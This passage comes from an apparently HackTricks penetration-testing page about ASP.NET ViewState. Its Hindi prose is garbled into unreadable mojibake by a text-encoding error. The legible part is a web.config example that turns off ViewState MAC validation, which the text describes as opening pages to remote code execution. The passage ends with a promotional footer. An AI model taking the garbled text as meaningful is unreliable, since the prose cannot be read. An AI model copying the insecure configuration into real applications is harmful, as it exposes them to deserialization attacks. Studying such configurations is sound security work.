рдХреЛ `Always` рд╕реЗрдЯ рдХрд░рдХреЗ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рднреА ASP.NET рдкреЗрдЬ рдЬреЛ `ViewStateEncryptionMode` рд╕рдВрдкрддреНрддрд┐ рдХреЛ `Auto` рдпрд╛ `Never` рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░рддреЗ рд╣реИрдВ, рд╣рдореЗрд╢рд╛ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб ViewState рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред рд╣рд╛рд▓рд╛рдВрдХрд┐, **ViewState MAC рд╕рддреНрдпрд╛рдкрди рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░рдиреЗ рдХреЗ рдХрд╛рд░рдг, рд╡реЗ рдЕрдм рдЕрд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдбреЗрдЯрд╛ рдХреЗ рджреНрд╡рд╛рд░рд╛ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рдкреНрд░рддрд┐ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛ рдЧрдП рд╣реИрдВ**ред рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдПрдХ рдЙрджрд╛рд╣рд░рдг рджрд┐рдЦрд╛рддрд╛ рд╣реИ:
```markup
<configuration>
тАж
<system.web>
тАж
<pages enableViewStateMac="false" viewStateEncryptionMode="Always" />
</system.web>
<appSettings>
<add key="aspnet:AllowInsecureDeserialization" value="false" />
</appSettings>
</configuration>
```
рдПрдХ рд╕реНрд╡рддрдВрддреНрд░ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдХреЗ рд▓рд┐рдП рдПрдХ рдФрдкрдЪрд╛рд░рд┐рдХ рдХреБрдВрдЬреА рдФрд░ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд╕рд╛рде `machineKey` рдЦрдВрдб рд╕реЗрдЯ рдХрд░рдирд╛ рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рдЕрдиреНрдп рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд░реЛрдХрд╛ рдЬрд╛ рд╕рдХреЗ!

рдпрд╣ рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ `EnableViewState` рд╕рдВрдкрддреНрддрд┐ рдХреЛ `False` рдкрд░ рд╕реЗрдЯ рдХрд░рдиреЗ рд╕реЗ рдпрд╣ рд╣рдорд▓рд╛ рд░реЛрдХрд╛ рдирд╣реАрдВ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ ASP.NET рджреНрд╡рд╛рд░рд╛ рдЕрднреА рднреА ViewState рдХреЛ рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдЪрд╛рд╣рд┐рдП? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
